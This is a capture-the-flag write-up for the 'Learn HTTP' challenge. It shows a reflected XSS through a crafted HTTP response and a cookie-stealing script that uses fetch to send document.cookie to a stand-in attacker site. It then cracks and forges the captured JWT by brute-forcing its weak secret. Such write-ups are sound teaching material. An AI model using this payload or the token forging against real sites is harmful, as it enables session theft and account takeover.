#### Problem: Learn HTTP


Problem Description:

I made a simple web application to teach you guys how HTTP responses work, I hope you enjoy :)
https://learn-http.ctf.pearlctf.in
===========================================================================================================

![image](https://github.com/alexsandusf/CTFWriteups/assets/162010016/470cb8b7-ad4b-4ad1-b4fd-f096c12d6527)


# Step 1

We have a page where we can enter a URL-encoded respone and going to the created link will open the message in plain-text.
We can also have a bot go check the page.

Lets first test to see if we can get an XSS to work.

https://learn-http.ctf.pearlctf.in/resp?body=HTTP%2F1.1%20200%20OK%0D%0A%0D%0A%3Cscript%3Ealert(1)%3C/script%3E

There is no filter so just using <script>alert(1)</script> and URL encoding will lead to XSS reflection.

# Step 2

Now lets see if we can steal the admins cookie as looking at the source code a token is used.

Lets try URL encoding this

HTTP/1.1 200 OK

<script>onload= fetch('Attacker Site'+document.cookie)</script>

------

We get this 

https://learn-http.ctf.pearlctf.in/resp?body=HTTP%2F1.1+200+OK%0D%0A%0D%0A%3Cscript%3Eonload%3D+fetch%28%27attackersite%27%2Bdocument.cookie%29%3C%2Fscript%3E

------

# Step 3

Now we have the JWT Token 
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwiaWF0IjoxNzA5OTI2MTE5fQ.X7k1ADBtMNXXy-KJ5XxIW5dyGE884FpatMKJ_W7DcT0

# Decoded Token
HEADER:ALGORITHM & TOKEN TYPE

{
  "alg": "HS256",
  "typ": "JWT"
}
PAYLOAD:DATA

{
  "id": 1,
  "iat": 1709926119
}

Looking at the source code we need ID set to 2 in order to be able to visit the /flag endpoint
We are unable to change the token unless we are able to get the JWT key

JWT cracker
https://github.com/lmammino/jwt-cracker

JWT Edit
https://jwt.io/

I used this JWT cracker and edit tool in order to find the secret key and change JWT token

# Step 4

![image](https://github.com/alexsandusf/CTFWriteups/assets/162010016/3796dcd5-5f86-441f-a932-3073a324cf65)

Secret key: banana

Next we can just edit the token and visit the flag endpoint in order to get the flag








